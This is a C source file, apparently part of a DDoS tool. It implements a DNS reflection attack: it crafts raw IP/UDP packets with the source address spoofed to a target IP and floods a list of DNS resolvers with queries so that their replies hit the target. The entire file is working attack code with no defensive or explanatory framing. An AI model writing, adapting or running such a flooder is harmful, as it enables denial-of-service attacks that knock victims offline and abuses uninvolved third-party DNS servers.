#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include "dnslist.h"

#define DNS_PORT 53
#define DNS_QUERY "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01"

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short udp_checksum(const struct iphdr *iph, const struct udphdr *udph, const unsigned char *payload, int payload_len) {
    char buf[65536];
    struct pseudo_header psh;
    int total_len = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + payload_len);

    memcpy(buf, &psh, sizeof(struct pseudo_header));
    memcpy(buf + sizeof(struct pseudo_header), udph, sizeof(struct udphdr));
    memcpy(buf + sizeof(struct pseudo_header) + sizeof(struct udphdr), payload, payload_len);

    return csum((unsigned short *)buf, total_len / 2);
}

void dns_amp(char *target_ip, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    int one = 1;
    const int *val = &one;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    unsigned char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    unsigned char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    int dns_query_len = sizeof(DNS_QUERY) - 1;
    memcpy(data, DNS_QUERY, dns_query_len);

    srand(time(NULL));
    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        for (int i = 0; i < sizeof(dns_resolvers) / sizeof(dns_resolvers[0]); i++) {
            struct sockaddr_in sin;
            sin.sin_family = AF_INET;
            sin.sin_port = htons(DNS_PORT);
            inet_pton(AF_INET, dns_resolvers[i], &sin.sin_addr);

            memset(packet, 0, sizeof(packet));

            iph = (struct iphdr *)packet;
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_query_len);
            iph->id = rand();
            iph->frag_off = 0;
            iph->ttl = 128;
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = inet_addr(target_ip);
            iph->daddr = sin.sin_addr.s_addr;
            iph->check = csum((unsigned short *)iph, sizeof(struct iphdr)/2);

            udph = (struct udphdr *)(packet + sizeof(struct iphdr));
            udph->source = htons(rand() % 65535);
            udph->dest = htons(DNS_PORT);
            udph->len = htons(sizeof(struct udphdr) + dns_query_len);
            udph->check = 0;
            udph->check = udp_checksum(iph, udph, data, dns_query_len);

            memcpy(data, DNS_QUERY, dns_query_len);

            sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + dns_query_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
        usleep(10000);  // ~10kpps/target
    }

    close(sock);
}
